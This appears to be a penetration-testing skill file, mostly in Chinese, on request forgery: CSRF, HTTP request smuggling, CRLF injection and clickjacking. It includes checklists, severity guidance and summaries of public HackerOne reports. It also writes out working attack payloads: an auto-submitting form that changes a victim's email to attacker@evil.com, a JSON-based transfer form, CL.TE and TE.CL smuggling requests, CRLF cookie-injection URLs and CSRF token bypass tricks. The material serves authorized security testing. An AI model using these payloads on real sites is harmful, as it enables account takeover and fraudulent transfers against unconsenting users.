# Request Forgery Penetration Testing Patterns

当对 Web 应用进行请求伪造渗透测试时加载此 Skill。覆盖 CSRF、HTTP 请求走私、CRLF 注入、Clickjacking 等。

## Attack Surface Discovery

**CSRF 高风险功能：**
- 状态变更操作：密码修改、邮箱更改、资金转账
- 账户管理：绑定/解绑第三方账户、修改安全设置
- API 操作：创建/删除资源、修改权限
- Token 管理：生成/撤销 API token

**HTTP 请求走私目标：**
- 前端代理（Nginx/HAProxy/CDN）与后端服务器之间
- 使用 HTTP/1.1 keep-alive 的负载均衡架构
- HTTP/2 降级到 HTTP/1.1 的代理场景

**CRLF 注入点：**
- 重定向 URL 参数、日志记录的输入字段
- HTTP 响应头中反射的用户输入

## Exploitation Techniques

**CSRF 攻击：**
```html
<!-- 基础 CSRF（无 token 保护） -->
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>

<!-- JSON 内容类型 CSRF -->
<form action="https://target.com/api/transfer" method="POST" 
      enctype="text/plain">
  <input name='{"amount":1000,"to":"attacker","x":"' value='"}'>
</form>
```

**CSRF 防护绕过：**
- Token 删除：移除 CSRF token 参数看是否仍然接受
- Token 重用：使用其他用户的 token 或过期 token
- Token 在 Cookie 中：CSRF token 来自 cookie 而非 session（可通过子域 XSS 设置）
- Referer 绕过：移除 Referer 头（`<meta name="referrer" content="no-referrer">`）
- Method 切换：POST 改为 GET（某些框架两者等价）

**HTTP 请求走私：**
```
# CL.TE（前端用 Content-Length，后端用 Transfer-Encoding）
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL（前端用 Transfer-Encoding，后端用 Content-Length）
POST / HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# HTTP/2 降级走私（H2.CL）
# 在 HTTP/2 请求中包含 Content-Length 头，降级时产生歧义
```

**CRLF 注入：**
```
# 注入 HTTP 响应头
https://target.com/redirect?url=http://target.com%0d%0aSet-Cookie:session=attacker

# 响应拆分（HTTP Response Splitting）
https://target.com/redirect?url=%0d%0a%0d%0a<script>alert(1)</script>

# 日志注入
username=admin%0d%0a[INFO] Fake log entry
```

**Clickjacking：**
- 检查 `X-Frame-Options` 和 CSP `frame-ancestors` 是否缺失
- 构造透明 iframe 覆盖在诱饵按钮上方
- 多步 clickjacking：引导用户完成多步敏感操作

## Detection Checklist

- [ ] 对所有状态变更操作检查 CSRF token 实现（是否存在、是否校验、是否可绕过）
- [ ] 测试移除 CSRF token 后请求是否仍被接受
- [ ] 测试 CSRF token 是否跨用户/跨 session 可用
- [ ] 使用 smuggler 工具测试 HTTP 请求走私（CL.TE、TE.CL、H2 降级）
- [ ] 在 URL 参数和 header 反射点测试 CRLF 注入（%0d%0a）
- [ ] 检查 X-Frame-Options 和 CSP frame-ancestors 防止 clickjacking
- [ ] 测试 SameSite cookie 属性是否正确设置
- [ ] 验证 Referer/Origin 检查是否可绕过
- [ ] 测试 JSON content-type 的 CSRF 可行性

## Impact Assessment

**漏洞利用可达到的效果：**
- CSRF：以受害者身份执行敏感操作（转账、改密码、改邮箱 → 账户接管）
- HTTP 走私：绕过 WAF/访问控制、窃取其他用户请求、缓存投毒
- CRLF 注入：设置恶意 cookie（session fixation）、响应拆分 → XSS
- Clickjacking：诱导用户执行非预期操作

**严重度判断：**
- **Critical**：CSRF 导致账户接管、HTTP 走私可窃取凭证或绕过认证
- **High**：CSRF 执行高危操作（资金转移）、请求走私影响其他用户
- **Medium**：CSRF 仅影响低价值操作、Clickjacking 需多步交互


## Real-World Cases

以下案例来自 HackerOne 公开披露的真实漏洞报告，展示了该类漏洞在实际目标中的表现形式。

### Case 1: Enjin — Revocation API Token by Bypassing The XSRF Token

- **严重度**: Critical | **CWE**: Cross-Site Request Forgery (CSRF)
- **摘要**: The revocation API token was bypassed by bypassing the XSRF token. This allowed the demonstration that the Enjin Platform's GraphQL interface lacked appropriate CSRF protection when utilizing a sessio...
- **报告**: https://hackerone.com/reports/2312217

### Case 2: HackerOne — Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone

- **严重度**: High | **CWE**: Cross-Site Request Forgery (CSRF)
- **摘要**: Improper CSRF token validation in HackerOne's integration authentication server allowed attackers to access victim's accounts linked to HackerOne. This vulnerability was due to the flawed authorizatio...
- **报告**: https://hackerone.com/reports/1727221

### Case 3: Internet Bug Bounty — Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)

- **严重度**: High | **CWE**: HTTP Request Smuggling
- **摘要**: A vulnerability in Apache Tomcat versions 11.0.0-M1 to 11.0.0-M11, 10.1.0-M1 to 10.1.13, 9.0.0-M1 to 9.0.80, and 8.5.0 to 8.5.93 allowed HTTP request smuggling due to improper parsing of trailer heade...
- **报告**: https://hackerone.com/reports/2299692

### Case 4: Internet Bug Bounty — CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444)

- **严重度**: High | **CWE**: HTTP Request Smuggling
- **摘要**: [SECURITY] CVE-2024-21733 Apache Tomcat - Information Disclosure
Severity: Important  
Vendor: The Apache Software Foundation

Versions Affected:
Apache Tomcat 9.0.0-M11 to 9.0.43
Apache Tomcat 8.5.7 ...
- **报告**: https://hackerone.com/reports/2327341

### Case 5: Internet Bug Bounty — Argo CD CSRF leads to Kubernetes cluster compromise

- **严重度**: High | **CWE**: Cross-Site Request Forgery (CSRF)
- **摘要**: Cross-Site Request Forgery (CSRF) in github.com/argoproj/argo-cd 
CVE-2024-22424
Severity: High

Impact
The Argo CD API prior to versions 2.10-rc2, 2.9.4, 2.8.8, and 2.7.16 are vulnerable to a cross-s...
- **报告**: https://hackerone.com/reports/2326194

### Case 6: Internet Bug Bounty — Possibility of Request smuggling attack

- **严重度**: High | **CWE**: HTTP Request Smuggling
- **摘要**: A vulnerability in Apache Tomcat allowed request smuggling due to incorrect parsing of HTTP trailer headers. A specially crafted trailer header exceeding the size limit could cause Tomcat to treat a s...
- **报告**: https://hackerone.com/reports/2280391

### Case 7: U.S. Dept Of Defense — CSRF leads to Account takeover

- **严重度**: High | **CWE**: Cross-Site Request Forgery (CSRF)
- **摘要**: The CSRF vulnerability was found on the endpoint https://██████████/account/profile/edit, which allowed an attacker to modify the victim's account information, including their username, password, and ...
- **报告**: https://hackerone.com/reports/2699029

### Case 8: U.S. Dept Of Defense — CSRF leads to Account takeover

- **严重度**: High | **CWE**: Cross-Site Request Forgery (CSRF)
- **摘要**: The target website was found vulnerable to CSRF, allowing an attacker to perform actions on the user's behalf without their knowledge or consent. The vulnerable endpoint was identified at https://████...
- **报告**: https://hackerone.com/reports/2712857

### Case 9: U.S. Dept Of Defense — CSRF Attack on changing security questions leads to full Account TakeOver

- **严重度**: High | **CWE**: Cross-Site Request Forgery (CSRF)
- **摘要**: The CSRF vulnerability in the security questions and password reset functionality of the website allowed an attacker to change a victim's security questions and answers, and then leverage this to rese...
- **报告**: https://hackerone.com/reports/2652603

### Case 10: ownCloud — Cross-Site Request Forgery 

- **严重度**: High | **CWE**: Cross-Site Request Forgery (CSRF)
- **摘要**: A cross-site request forgery vulnerability was found in an application. Requests were not validating cross-site request forgery tokens, allowing an unauthorized user to perform administration function...
- **报告**: https://hackerone.com/reports/2041007

